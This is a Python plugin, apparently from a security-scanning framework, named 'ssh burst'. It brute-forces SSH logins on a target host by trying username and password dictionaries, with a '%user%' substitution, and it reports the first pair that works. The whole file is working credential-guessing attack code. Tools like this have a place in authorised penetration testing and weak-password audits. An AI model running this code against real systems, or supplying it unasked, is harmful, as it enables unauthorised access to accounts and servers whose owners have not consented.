#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import paramiko
from paramiko.ssh_exception import SSHException
from script import Script, SERVICE_PORT_MAP
from lib.core.data import paths

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.SSH
        self.name = 'ssh burst'
        self.keyword = ['ssh', 'burst']
        self.info = 'Burst ssh weakpass.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        ssh = paramiko.SSHClient()
        paramiko.util.log_to_file(os.path.join(paths.LOG_PATH, '.ssh.tmp'))
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/ssh_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/ssh_passwords.txt')
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                try:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    ssh.connect(hostname=self.target_host, username=username,password = password, port=self.target_port,timeout=5)
                    self.flag = 1
                    self.res.append({"info": username + "/" + password, "key": "ssh burst"})
                    return
                except Exception as e:
                    if "Errno 10061" in str(e) or "timed out" in str(e) or 'NoValidConnectionsError' in str(e):
                        return